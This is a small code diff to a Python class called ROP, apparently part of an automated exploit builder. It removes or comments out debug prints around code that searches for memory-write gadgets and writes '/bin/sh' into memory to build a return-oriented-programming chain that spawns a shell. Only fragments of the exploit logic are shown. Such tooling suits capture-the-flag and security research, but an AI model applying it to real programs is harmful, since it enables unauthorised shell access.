@@ -67,7 +67,6 @@ class ROP:
         else:
             self.fart_print.warning("Exploit not found!")
         
-        print(payload)
         return payload
     
     def set_offset(self):
@@ -266,6 +265,7 @@ class ROP:
             if 'qword ptr [' in i and 'mov' in i:
                 return i
         return None
+
     def get_primitives(self):
         return p64(int(self.get_primitives_str().split(':')[0],16))
 
@@ -278,7 +278,7 @@ class ROP:
     
     # writes /bin/sh into memory
     def write_binsh_manual(self):
-        print("buffer length is "+str(len(self.set_offset())))
+        #print("buffer length is "+str(len(self.set_offset())))
         ret = b''
         ret += self.fill_reg(self.get_primitive_regs()[1].strip(' '), '/bin/sh\0')
         ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
